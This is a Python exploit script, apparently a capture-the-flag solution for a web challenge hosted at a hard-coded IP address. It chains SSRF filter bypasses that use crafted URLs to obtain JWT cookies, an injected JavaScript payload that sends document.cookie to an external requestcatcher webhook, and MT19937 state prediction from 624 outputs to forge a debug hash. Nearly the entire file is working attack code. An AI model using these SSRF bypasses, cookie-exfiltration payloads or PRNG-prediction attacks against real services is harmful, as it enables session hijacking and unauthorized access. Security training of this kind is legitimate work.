import httpx
from mt19937predictor import MT19937Predictor

URL = "http://77.37.47.226:1811"

WEBHOOK = "https://demoaja.requestcatcher.com/testcok?c="

ENC_FLAG = "400d63a4cc4ba2fac3716bd29ebfc563"
demo = "http://youtube.com&@google.com#@wikipedia.com/"

host = '\\g\\o\\o\\g\\l\\e.c\\o\\m'

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url, timeout=60)
    def ssrf_and_get_jwt_by_hosts(self):
        r = self.c.post('/hosts', data={
            'host': host
        })
        # print(r.text)
        self.simulate_adm2 = r.cookies.get('jwt2')
        print('ssrf /hosts bypassed, this the jwt : ', self.simulate_adm2)
    def ssrf_and_get_jwt_by_requests(self):
        r = self.c.post('/requests', data={
            'url': demo
        })
        # print(r.text)
        self.simulate_adm1 = r.cookies.get('jwt')
        print('ssrf /requests bypassed, this the jwt : ', self.simulate_adm1)
    def submit(self):
        r = self.c.post('/check', data={
            'pop_rdi': 'about:blank', 
            'timeout':'15000',
            'category':'mousedown', 
            'my-headache':'Severe headache triggered by JS!',
            # why we trigger alert? to load the window location so it will not close
            'your-headache':f"window.location.href = \"{WEBHOOK}\"+document.cookie;alert(document.cookie)",
            
            # for debug
            # 'your-headache':"fetch('http://localhost:1811/flag?flag=33671c99be5c1b5988f6d358f24093c4').then(r => r.text()).then(alert).catch(console.error);",
            # 'your-headache':"alert(document.cookie)",
            'number-selector':'1000',
            'number-happy':'-1000'
            })
        print(r.text)
        
    def get_flag(self):
        predictor = MT19937Predictor()

        for _ in range(624):
            x = self.c.get('/debug?debug=1')
            predictor.setrandbits(int(x.json()['hash']), 32) 
        r = self.c.get('/debug', params={
            'hash':predictor.getrandbits(32),
            'flag':ENC_FLAG
        })
        print(r.text)
        
class API(BaseAPI):
    ...

if __name__ == "__main__":
    api = API()
    # api.get_flag()
    api.ssrf_and_get_jwt_by_requests()
    api.ssrf_and_get_jwt_by_hosts()
    api.submit()